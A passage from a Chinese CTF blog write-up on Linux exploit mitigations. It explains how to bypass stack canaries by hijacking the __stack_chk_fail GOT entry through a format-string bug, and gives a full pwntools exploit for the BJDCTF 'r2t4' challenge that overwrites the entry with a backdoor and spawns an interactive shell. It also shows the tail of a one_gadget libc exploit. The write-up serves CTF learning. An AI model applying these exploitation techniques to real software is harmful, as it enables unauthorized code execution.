libc.dump('str_bin_sh')</span></span><br><span class="line"><span class="comment">#payload = p64(pop_rdi) + p64(bin_sh) + p64(sys)</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x4f322</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
<h2 id="3-5-劫持-stack-chk-fail函数"><a href="#3-5-劫持-stack-chk-fail函数" class="headerlink" title="3.5 劫持__stack_chk_fail函数"></a>3.5 劫持__stack_chk_fail函数</h2><p>改写__stack_chk_fail@got，但前提是必须有一个可以向任意地址写的漏洞，例如说格式化字符串漏洞<br>这个方法适用于只能输入一次的程序，如果说可以利用多次的话就可以直接泄露canary了</p>
<h3 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h3><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222203954917.png" alt="image-20210222203954917"></p>
<p>基本思路</p>
<ol>
<li>劫持got表去backdoor</li>
</ol>
<blockquote>
<p>pwntools自动生成fmt是要看64位还是32位</p>
<p>所以需要改架构</p>
</blockquote>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./r2t4"</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25608</span>)</span><br><span class="line"><span class="comment">#p = process('./r2t4')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">backdoor = elf.sym[<span class="string">'backdoor'</span>]</span><br><span class="line">print(hex(backdoor))</span><br><span class="line"><span class="comment">#payload = b"%64c%9$hn%1510c%10$hnAAA" + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;__stack_chk_fail:backdoor&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">'A'</span>)</span><br><span class="line">s(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

        </div></article>
      <nav class="pagination"><a class="prev" href="/page/3/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text">Prev</span>
      </a>
    <a class="next" href="/page/5/">
        <span class="next-text">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></section></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:pz1olzy@aliyun.com" class="iconfont icon-email" title="email"></a>
        <a href="https://stackoverflow.com" target="_blank" rel="noopener" class="iconfont icon-stack-overflow" title="stack-overflow"></a>
        <a href="https://twitter.com" target="_blank" rel="noopener" class="iconfont icon-twitter" title="twitter"></a>
        <a href="https://google.com" target="_blank" rel="noopener" class="iconfont icon-google" title="google"></a>
        <a href="https://github.com/pz1o" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
        <a href="https://zhihu.com" target="_blank" rel="noopener" class="iconfont icon-zhihu" title="zhihu"></a>
        <a href="https://douban.com" target="_blank" rel="noopener" class="iconfont icon-douban" title="douban"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
  </span>

  <span class="copyright-year">&copy;2020 - 2021<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">M1key</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
